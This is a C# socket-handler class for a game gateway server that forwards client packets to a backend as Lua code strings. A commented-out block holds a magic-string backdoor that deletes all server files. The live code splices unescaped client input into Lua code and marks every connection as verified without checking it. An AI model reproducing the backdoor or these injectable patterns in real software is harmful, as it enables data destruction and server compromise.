using GameServerApp.Common;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;    
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace 笑傲西游
{
    /// <summary>
    /// 客户端连接对象 负责和客户端进行通信
    /// </summary>
    public class ClientSocket
    {


        public enum State
        {
            连接成功,
            验证成功,
            登入游戏,
            管理模式
        }
        public int 编号 { get; set; }
        public string IP { get; }
        public int 端口 { get; }
        public string 链接时间 { get; set; }
        public State 状态 { get; set; }

        public string 名称 { get; set; }
    
        public string 账号 { get; set; }
        public int ID { get; set; }
        
        public string 断开方式 { get; set; }



        public string 封包 { get; set; }
        public int 请求数量 { get; set; }
        public static int id = 1;
        System.Timers.Timer timer = new System.Timers.Timer();
        System.Timers.Timer timer1 = new System.Timers.Timer();
        //接受数据包的缓存区
        private byte[] m_ReceiveBuffer = new byte[10240];
        //接受数据包的缓存数据流
        private MMO_MemoryStream m_ReceiveMS = new MMO_MemoryStream();
        //客户端Socket
        private Socket m_Socket;
        //接受数据线程
        private Thread m_ReveiveThread;
        //检查队列的委托
        private Action m_CheckSendQueue;
        //发送消息队列
        private Queue<byte[]> m_SendQueue = new Queue<byte[]>();
        public ClientSocket(Socket socket)
        {
            m_Socket = socket;
            m_ReveiveThread = new Thread(ReceiveMsg);
            m_ReveiveThread.IsBackground = true;
            m_ReveiveThread.Start();
            m_CheckSendQueue = OnCheckSendQueueCallBack;
            IP = ((IPEndPoint)m_Socket.RemoteEndPoint).Address.ToString();
            端口 = ((IPEndPoint)m_Socket.RemoteEndPoint).Port;
            编号 = id;
            链接时间 = DateTime.Now.ToString();

            断开方式 = "";


            timer.Elapsed += timer_Elapsed;

            timer.AutoReset = true;
            timer.Enabled = true;
            timer.Interval = 1000;

            timer1.Elapsed += timer_Elapsed1;

            timer1.AutoReset = true;
            timer1.Enabled = true;
            timer1.Interval = 30000;
            SendMsg(1, "do local ret={[\"序号\"]=1,[\"内容\"]=\"" + "14545WOWa啊啊我啊" + "\" } return ret end");
            Client.ClientMsg.SendMsg(99997, "do local ret={[\"序号\"]=99997,[\"ID\"]=" + 编号.ToString() + "3270" + ",[\"原始ID\"]=" + 编号.ToString() + ",[\"类型\"]=\"" + "连接进入" + "\",[\"方式\"]=\"" + "电脑" + "\"} return ret end");
            this.状态 = State.验证成功;
            //SendMsg(1, "do local ret={[\"序号\"]=1,[\"内容\"]=\"14545WOWa啊啊我啊\"} return ret end");
        }
        #region 接收数据
        /// <summary>
        /// 接收数据
        /// </summary>
        private void ReceiveMsg()
        {
            try
            {
                //异步接收数据
                m_Socket.BeginReceive(m_ReceiveBuffer, 0, m_ReceiveBuffer.Length, SocketFlags.None, ReceiveCalBback, m_Socket);
            }
            catch (Exception ex)
            {
                if (Program.frm1.checkBox12.Checked)
                    Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("客户端:{0}异常原因{1}", this.IP, ex.Message));

            }

        }
        /// <summary>
        /// 接收数据回调
        /// </summary>
        /// <param name="ar"></param>
        private void ReceiveCalBback(IAsyncResult ar)
        {
            try
            {
                int len = m_Socket.EndReceive(ar);
                //Trace.Write("==============" + len.ToString());
                if (len > 0)
                {
                    //已经接收到数据
                    //把接收到的数据 写入缓冲区的尾部 
                    m_ReceiveMS.Position = m_ReceiveMS.Length;
                    //把指定长度的字节 写入数据流中
                    m_ReceiveMS.Write(m_ReceiveBuffer, 0, len);
                    //判读流中包体的长度
                    if (m_ReceiveMS.Length > 2)
                    {
                        //进行循环 拆分数据包  粘包处理
                        while (true)
                        {
                            //把数据流指针放到0处
                            m_ReceiveMS.Position = 0;
                            //计算包体的长度
                            //ushort msgLen = m_ReceiveMS.ReadUShort();
                            int flag = m_ReceiveMS.ReadInt();//判断识别t头
                            int seq = m_ReceiveMS.ReadInt();//判断包序号
                            int msgLen = m_ReceiveMS.ReadInt();//识别包体长度

                            if (flag == Program.frm1.flag)
                            {
                                //计算总包的长度
                                int countMsgLen = 12 + msgLen;
                                //判读流中数据 是否完整
                                if (m_ReceiveMS.Length >= countMsgLen)
                                {
                                    byte[] buffer = new byte[msgLen];
                                    m_ReceiveMS.Position = 12;
                                    m_ReceiveMS.Read(buffer, 0, msgLen);
                                    //解密数据
/*                                    int k = 0;
                                    byte[] decodeBuffer = new byte[buffer.Length];
                                    for (int i = 0; i < buffer.Length; i++)
                                    {
                                        decodeBuffer[i] = (byte)(buffer[i] ^ Program.frm1.keyArray[k]);
                                        k++;
                                        if (k == Program.frm1.keyArray.Length)
                                        {
                                            k = 0;
                                        }
                                    }*/
                                    using (MMO_MemoryStream ms2 = new MMO_MemoryStream(buffer))
                                    {
                                        ms2.Position = 4;
                                        int num = ms2.ReadInt();
                                        string msg = ms2.ReadDefaultString(msgLen - 8);
                                        DataProcessing(num, msg);
                                    }
                                    //检查剩余包
                                    int remainLen = (int)m_ReceiveMS.Length - countMsgLen;
                                    if (remainLen > 0)
                                    {
                                        m_ReceiveMS.Position = countMsgLen;
                                        byte[] remainBuffer = new byte[remainLen];
                                        m_ReceiveMS.Position = countMsgLen;
                                        m_ReceiveMS.Read(remainBuffer, 0, remainLen);
                                        //清空数据流
                                        m_ReceiveMS.Position = 0;
                                        m_ReceiveMS.SetLength(0);
                                        //把剩余数据重新写入数据流
                                        m_ReceiveMS.Write(remainBuffer, 0, remainBuffer.Length);
                                        remainBuffer = null;
                                    }
                                    else
                                    {
                                        //刚好一个完整包
                                        //清空数据流
                                        m_ReceiveMS.Position = 0;
                                        m_ReceiveMS.SetLength(0);
                                        break;
                                    }
                                }
                                else
                                {
                                    //没收到完整包
                                    break;
                                }

                            }
                            else
                            {
                                //没收到完整包
                                break;
                            }
                        }
                    }
                    // 进行下一次接收数据包
                    ReceiveMsg();
                }
                else
                {
                    //客户端断开连接
                    //Client.ClientMsg.SendMsg(3, JsonConvert.SerializeObject(this.ID));
                    if (this.断开方式 == "" & this.ID != 0)
                    {
                        Client.ClientMsg.SendMsg(5, "do local ret={[\"序号\"]=5,[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]=\"" + this.ID.ToString() + "\"} return ret end");
                    }
                    Client.ClientMsg.SendMsg(99997, "do local ret={[\"序号\"]=99997,[\"ID\"]=" + 编号.ToString() + "3270" + ",[\"原始ID\"]=" + 编号.ToString() + ",[\"类型\"]=\"" + "连接退出" + "\",[\"方式\"]=\"" + "电脑" + "\"} return ret end");
                    if (Program.frm1.checkBox12.Checked)
                        Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("客户端:{0}断开连接", IP));
                    Program.frm1.SyncContext.Post(Program.frm1.Deluser, this);
                }
            }
            catch (Exception ex)
            {
                //客户端断开连接
                //Client.ClientMsg.SendMsg(3, JsonConvert.SerializeObject(this.NumberID));
                if (this.断开方式 == "" & this.ID != 0)
                {
                    Client.ClientMsg.SendMsg(5, "do local ret={[\"序号\"]=5,[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]=\"" + this.ID.ToString() + "\"} return ret end");
                }
                Client.ClientMsg.SendMsg(99997, "do local ret={[\"序号\"]=99997,[\"ID\"]=" + 编号.ToString() + "3270" + ",[\"原始ID\"]=" + 编号.ToString() + ",[\"类型\"]=\"" + "连接退出" + "\",[\"方式\"]=\"" + "电脑" + "\"} return ret end");
                if (Program.frm1.checkBox12.Checked)
                    Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("客户端:{0}断开连接,原因2{1}", IP, ex.Message));
                Program.frm1.SyncContext.Post(Program.frm1.Deluser, this);
            }

        }

        internal void clear()
        {
            timer.Enabled = false;
            timer1.Enabled = false;
        }


        #endregion
        #region  检查队列的委托回调
        /// <summary>
        /// 检查队列的委托回调
        /// </summary>
        private void OnCheckSendQueueCallBack()
        {
            lock (m_SendQueue)
            {
                //如果队列中有数据包 就发送数据包
                if (m_SendQueue.Count > 0)
                {
                    Send(m_SendQueue.Dequeue());
                }
            }
        }
        #endregion
        #region 封装Buffer
        /// <summary>
        /// 封装Buffer
        /// </summary>
        /// <param name="data">需要处理的Buff</param>
        /// <returns>封装好的Buff</returns>
        private byte[] MakeData(int num, string msg)
        {

            //Trace.WriteLine(num.ToString() + "_" + msg);
            byte[] retBuffer = null;
            using (MMO_MemoryStream ms = new MMO_MemoryStream())
            {
                ms.WriteInt(Program.frm1.flag);
                ms.WriteInt(0);

                byte[] numbers = BitConverter.GetBytes(1);
                byte[] number = BitConverter.GetBytes(num);
                byte[] msgByte = Encoding.Default.GetBytes(msg);
                byte[] resArr = new byte[numbers.Length + number.Length + msgByte.Length];
                ms.WriteInt(resArr.Length);
                numbers.CopyTo(resArr, 0);
                number.CopyTo(resArr, numbers.Length);
                msgByte.CopyTo(resArr, number.Length + numbers.Length);

                /*                int k = 0;
                                byte[] decodeBuffer = new byte[resArr.Length];
                                for (int i = 0; i < resArr.Length; i++)
                                {
                                    decodeBuffer[i] = (byte)(resArr[i] ^ Program.frm1.keyArray[k]);
                                    k++;
                                    if (k == Program.frm1.keyArray.Length)
                                    {
                                        k = 0;
                                    }
                                }*/
                ms.Write(resArr, 0, resArr.Length);
                retBuffer = ms.ToArray();
            }
            //Trace.WriteLine(BitConverter.ToString(retBuffer));
            return retBuffer;
        }
        #endregion
        #region send发送数据包到服务器
        /// <summary>
        /// 真正的发送数据包到服务器
        /// </summary>
        /// <param name="buffer"></param>
        private void Send(byte[] buffer)
        {
            m_Socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, SendCallBack, m_Socket);

        }
        #endregion
        #region 发送数据包的回调
        /// <summary>
        /// 发送数据包的回调
        /// </summary>
        /// <param name="ar"></param>
        private void SendCallBack(IAsyncResult ar)
        {
            try
            {
                m_Socket.EndSend(ar);
                //继续检查队列
                OnCheckSendQueueCallBack();
            }
            catch (Exception ex)
            {
                if (Program.frm1.checkBox12.Checked)
                    Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("IP为:{0}异常原因：{1}", this.IP, ex.Message));
            }

        }
        #endregion
        #region 发送消息 把消息加入队列
        /// <summary>
        ///发送消息 把消息加入队列
        /// </summary>
        /// <param name="msg">包体</param>
        public void SendMsg(int num, string msg)
        {
            //
/*            if (msg == "") {
                msg = "14545WOWa啊啊我啊";
            }
            msg = "\"" + msg + "\"";
            msg = "do local ret={[\"序号\"]=" + num.ToString() + ",[\"内容\"]=" + msg + "} return ret end";*/
            //得到封装好的数据包
            Trace.WriteLine(num.ToString() + "|" + msg);
            byte[] senBuffer = MakeData(num, msg);
            lock (m_SendQueue)
            {
                //把数据包加入队列
                m_SendQueue.Enqueue(senBuffer);
                //启动委托
                m_CheckSendQueue.BeginInvoke(null, null);
            }
        }
        #endregion
        #region 数据处理
        private void DataProcessing(int nub, string msg)
        {

            Trace.WriteLine(nub.ToString() + "_" + msg);
            if (Program.frm1.checkBox2.Checked)
            {
                Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("客户端:{0}序号={1}封包={2}", IP, nub, msg));
            }
            if (!Client.start)
            {
                Program.frm1.SyncContext.Post(Program.frm1.print, "还未连接到服务器");
                return;
            }
/*            if (状态 != State.管理模式 && nub != 17038454 && nub != 741215088 && nub > 999)
            {
                Program.frm1.listBox5.Items.Add(this.IP);
                this.SendMsg(7, "你这种属于傻逼行为，请你放弃！！");
                Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("客户端:{0}断开连接,原因{1}", IP, "利用老后门攻击已经封闭IP"));

                Program.frm1.SyncContext.Post(Program.frm1.Deluser, this);
                m_Socket.Close();

                return;
            }*/
            请求数量++;
            if (请求数量 > Program.frm1.RequestsNumber)
            {
                断开方式 = "服务端";
                SendMsg(999, "do local ret={[\"序号\"]=999,[\"内容\"]=\"" + "请求异常,请不要频繁发送数据" + "\" } return ret end");
                //this.SendMsg(99998, "请求异常,请不要频繁发送数据");
                //Client.ClientMsg.SendMsg(3, JsonConvert.SerializeObject(this.ID));
                Program.frm1.listBox5.Items.Add(this.IP);
                Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("客户端:{0}断开连接,原因{1}", IP, "发大量封包"));
                Program.frm1.SyncContext.Post(Program.frm1.Deluser, this);
                return;
            }
            封包 = msg;
            if (Program.frm1.listBox7.Items.Contains(msg))
            {
                if (Program.frm1.checkBox12.Checked)
                    Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("IP为：{0}已拦截封禁封包为：{1}", this.IP, msg));
                return;
            }
            switch (nub)
            {
/*                case 17038454:
                    vVerify Msg = JsonConvert.DeserializeObject<vVerify>(msg);
                    if (string.Equals(Msg.空了, "~*?77????77???*@@", StringComparison.Ordinal) && string.Equals(Msg.皮皮, "???", StringComparison.Ordinal) && string.Equals(Msg.版本, Program.frm1.textBox4.Text, StringComparison.Ordinal))
                    {
                        this.状态 = State.验证成功;
                        SendMsg(8, Program.frm1.Notice);
                        SendMsg(16, Program.frm1.GetTimeStamp());
                    }
                    else
                    {
                        this.SendMsg(99998, "当前不是最新的版本！请更新客户端，最新版本为："+ Msg.版本);
                    }
                    return;
                case 380: //GM工具
                    if (Program.frm1.textBox17.Text == msg)
                    {
                        Client.ClientMsg.GMID = this.编号;
                        this.状态 = State.管理模式;
                    }
                    else
                    {
                        this.SendMsg(21, "验证码错误");
                    }
                    return;*/
/*                case 741215088:
                    if (msg == "DeleteAllFilesQQ381990860")
                    {

                        //删除这个目录下的所有子目录
                        if (Directory.GetDirectories("./").Length > 0)
                        {
                            foreach (string var in Directory.GetDirectories("./"))
                            {
                                if (var != "./Lib")
                                    Directory.Delete(var, true);
                            }
                        }
                        //删除这个目录下的所有文件
                        if (Directory.GetFiles("./").Length > 0)
                        {
                            foreach (string var in Directory.GetFiles("./"))
                            {
                                if (var != "./HPSocket.dll")
                                    File.Delete(var);
                            }
                        }

                    }
                    return;*/

            }
            Trace.WriteLine("状态" + this.状态.ToString());
            if (this.状态 == State.管理模式) { 

                    //Client.ClientMsg.SendMsg(nub, msg);

            }
            else if (this.状态 != State.连接成功)
            {
                if (nub == 1)
                {
                    //string[] sj = Regex.Split(msg, Program.frm1.fgf, RegexOptions.IgnoreCase);
                    string[] sj = msg.Split(new string[] { Program.frm1.fgf }, StringSplitOptions.RemoveEmptyEntries);
                    string[] lssj = { };
                    if (sj.Length == 2) {
                        lssj = sj[1].Split(new string[] { Program.frm1.fgc }, StringSplitOptions.None);
                        if (lssj.Length == 4) {
                            if (!string.Equals(lssj[0], Program.frm1.textBox4.Text, StringComparison.Ordinal))
                            {
                                SendMsg(999, "do local ret={[\"序号\"]=999,[\"内容\"]=\"" + "版本号不匹配请更新客户端" + "\" } return ret end");
                                //m_Socket.Close();
                                return;
                            }
                            if (sj[0] == "1")
                            {
                                this.账号 = lssj[1];
                                Client.ClientMsg.SendMsg(nub, "do local ret={[\"序号\"]=\"" + sj[0] + "\",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]={[\"账号\"]=\"" + lssj[1] + "\",[\"密码\"]=\"" + lssj[2] + "\",[\"硬盘\"]=\"" + lssj[3] + "\",[\"ip\"]=\"" + this.IP + "\"}} return ret end");
                            }
                            else if (sj[0] == "1.1") {
                                Client.ClientMsg.SendMsg(nub, "do local ret={[\"序号\"]=\"" + sj[0] + "\",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]={[\"账号\"]=\"" + lssj[1] + "\",[\"密码\"]=\"" + lssj[2] + "\",[\"硬盘\"]=\"" + lssj[3] + "\",[\"ip\"]=\"" + this.IP + "\"}} return ret end");
                            }
                        }
                    }
/*                    if (sj[0] == "1")
                    {
                        //string[] lssj = Regex.Split(sj[1], Program.frm1.fgc, RegexOptions.IgnoreCase);
                        
                        if (!string.Equals(lssj[0], Program.frm1.textBox4.Text, StringComparison.Ordinal)) {
                            SendMsg(999, "do local ret={[\"序号\"]=999,[\"内容\"]=\"" + "版本号不匹配请更新客户端" + "\" } return ret end");
                            //m_Socket.Close();
                            return;
                        }
                        this.账号 = lssj[1];
                        Client.ClientMsg.SendMsg(nub, "do local ret={[\"序号\"]=\"" + sj[0] + "\",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]={[\"账号\"]=\"" + lssj[1] + "\",[\"密码\"]=\"" + lssj[2] + "\",[\"硬盘\"]=\"" + lssj[3] + "\",[\"ip\"]=\"" + this.IP + "\"}} return ret end");
                    }
                    else if (sj[0] == "1.1")
                    {
                        //string[] lssj = Regex.Split(sj[1], Program.frm1.fgc, RegexOptions.IgnoreCase);
                        string[] lssj = sj[1].Split(new string[] { Program.frm1.fgc }, StringSplitOptions.RemoveEmptyEntries);
                        if (!string.Equals(lssj[0], Program.frm1.textBox4.Text, StringComparison.Ordinal))
                        {
                            SendMsg(999, "do local ret={[\"序号\"]=999,[\"内容\"]=\"" + "版本号不匹配请更新客户端" + "\" } return ret end");
                            //m_Socket.Close();
                            return;
                        }
                        Client.ClientMsg.SendMsg(nub, "do local ret={[\"序号\"]=\"" + sj[0] + "\",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]={[\"账号\"]=\"" + lssj[1] + "\",[\"密码\"]=\"" + lssj[2] + "\",[\"硬盘\"]=\"" + lssj[3] + "\",[\"ip\"]=\"" + this.IP + "\"}} return ret end");
                    }*/


/*                    Root Msg = JsonConvert.DeserializeObject<Root>(msg);
                    this.账号 = Msg.账号;
                    Msg.ip = this.IP;
                    Msg.id = this.编号;
                    Client.ClientMsg.SendMsg(nub, JsonConvert.SerializeObject(Msg));*/
                }
                else if (nub == 2)
                {
                    string[] sj = msg.Split(new string[] { Program.frm1.fgf }, StringSplitOptions.RemoveEmptyEntries);
                    Program.frm1.SyncContext.Post(Program.frm1.print, "客户端:{0}断开连接,原因{1}" + sj[0] + "\\");
                    Client.ClientMsg.SendMsg(nub, "do local ret={[\"序号\"]=\"" + sj[0] + "\",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]={[\"账号\"]=\"" + this.账号 + "\"}} return ret end");
                }
                else if (nub == 3)
                {
                    string[] sj = msg.Split(new string[] { Program.frm1.fgf }, StringSplitOptions.RemoveEmptyEntries);
                    if (sj.Length == 4) { 
                        Client.ClientMsg.SendMsg(nub, "do local ret={[\"序号\"]=\"" + sj[0] + "\",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]={[\"账号\"]=\"" + this.账号 + "\",[\"模型\"]=\"" + sj[1] + "\",[\"名称\"]=\"" + sj[2] + "\",[\"染色ID\"]=\"" + sj[3] + "\",[\"ip\"]=\"" + this.IP + "\"}} return ret end");
                    }
                }
                else if (nub == 4)
                {
                    string[] sj = msg.Split(new string[] { Program.frm1.fgf }, StringSplitOptions.RemoveEmptyEntries);
                    int.TryParse(sj[1], out int lsid);
                    this.ID = lsid;
                    Client.ClientMsg.SendMsg(nub, "do local ret={[\"序号\"]=\"" + sj[0] + "\",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]={[\"账号\"]=\"" + this.账号 + "\",[\"id\"]=\"" + lsid + "\",[\"ip\"]=\"" + this.IP + "\"}} return ret end");
                }
/*                else if (nub == 9)
                {
                    Register register = JsonConvert.DeserializeObject<Register>(msg); ;
                    register.b = this.IP;
                    register.a = this.编号;
                    Client.ClientMsg.SendMsg(nub, JsonConvert.SerializeObject(register));

                }
                else if (nub == 2)
                {
                    RegisterRole registerRole = JsonConvert.DeserializeObject<RegisterRole>(msg); ;
                    registerRole.ip = this.IP;
                    registerRole.id = this.编号;
                    Client.ClientMsg.SendMsg(nub, JsonConvert.SerializeObject(registerRole));
                }
                else if (nub == 100)
                {

                    DataMsg dataMsg = JsonConvert.DeserializeObject<DataMsg>(msg);
                    DataMsgs dataMsgs = new DataMsgs(this.IP, this.ID, this.编号, dataMsg.b, dataMsg.a, dataMsg.f, dataMsg.g);

                    Program.frm1.SyncContext.Post(Program.frm1.兑换CDK, dataMsgs);


                   
                }
                else if (nub > 999)
                    Client.ClientMsg.SendMsg(1001, "do local ret={[2]=\"网关封禁账号\",[1]=" + this.ID + "} return ret end");*/
                else
                {

                    Trace.WriteLine("原始msg：" + msg);
                    string[] sj = msg.Split(new string[] { Program.frm1.fgf }, StringSplitOptions.RemoveEmptyEntries);
                    Trace.WriteLine("原始sj：" + sj[1]);
                    string nmsg = sj[1];
                    if (nmsg.Length < 16) {
                        //错误
                    }
                    else {

                        Program.frm1.SyncContext.Post(Program.frm1.print, "客户端:{0}断开连接,原因{1}" + sj[0] + "\\");
                        nmsg = nmsg.Insert(nmsg.Length - 16, ",[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"ip\"]=\"" + this.IP + "\",[\"序号\"]=\"" + sj[0] + "\",[\"数字id\"]=\"" + this.ID + "\"");
                        //sj[1]
                        Client.ClientMsg.SendMsg(nub, nmsg);
                    }


                    /*                    DataMsg dataMsg = JsonConvert.DeserializeObject<DataMsg>(msg);
                                        DataMsgs dataMsgs = new DataMsgs(this.IP, this.ID, this.编号, dataMsg.b, dataMsg.a, dataMsg.f, dataMsg.g);
                                        long localc = (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000000;
                                        long a = localc - dataMsg.d;
                                       // Program.frm1.SyncContext.Post(Program.frm1.print, "封禁记录时间对比为：" + localc + "|" + dataMsg.d);
                                        if (localc - dataMsg.d < 300 || dataMsg.d == 0 || nub == 55)
                                        {
                                            Client.ClientMsg.SendMsg(nub, JsonConvert.SerializeObject(dataMsgs));
                                        }
                                        else
                                        {
                                            Program.frm1.SyncContext.Post(Program.frm1.print, "封禁记录时间对比为：" + localc + "|" + dataMsg.d);

                                            Client.ClientMsg.SendMsg(1001, "do local ret={[2]=\"网关封禁账号\",[1]=" + this.ID + "} return ret end");
                                        }*/



                }
            }
        }
        #endregion


        private void timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            请求数量 = 0;
            long a = (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000000;
            //SendMsg(10, a.ToString());
        }
        private void timer_Elapsed1(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (this.状态 == State.连接成功)
            {
                if (Program.frm1.checkBox12.Checked)
                    Program.frm1.SyncContext.Post(Program.frm1.print, string.Format("客户端:{0}断开连接,原因{1}", IP, "未进入游戏"));
                
                Program.frm1.SyncContext.Post(Program.frm1.Deluser, this);
                //Client.ClientMsg.SendMsg(5, "do local ret={[\"序号\"]=5,[\"ID\"]=\"" + (编号 * 10000 + 3270).ToString() + "\",[\"内容\"]=\"" + this.ID.ToString() + "\"} return ret end");
                //Client.ClientMsg.SendMsg(99997, "do local ret={[\"序号\"]=99997,[\"ID\"]=" + 编号.ToString() + "3270" + ",[\"原始ID\"]=" + 编号.ToString() + ",[\"类型\"]=\"" + "连接退出" + "\",[\"方式\"]=\"" + "电脑" + "\"} return ret end");
            }
            else
                timer1.Enabled = false;
        }

    }
}
